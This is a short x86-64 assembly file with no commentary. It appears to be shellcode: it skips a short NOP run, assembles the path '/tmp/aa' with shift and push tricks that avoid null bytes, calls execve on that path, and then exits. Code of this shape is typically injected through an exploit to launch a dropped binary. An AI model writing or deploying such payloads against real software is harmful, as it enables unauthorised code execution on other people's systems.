.section .text
.globl _start
_start:
    jmp skip_instructions
    nop
    nop
    nop
    nop
    nop
    nop
    nop

skip_instructions:
    push $0x3b
    pop %rax
    xor %rdx, %rdx
    movabs $0x61612f706d742f2f, %r8
    shr $0x8, %r8                    
    push %r8
    mov %rsp, %rdi
    push %rdx
    push %rdi
    mov %rsp, %rsi
    syscall
    push $0x3c
    pop %rax
    xor %rdi, %rdi
    syscall
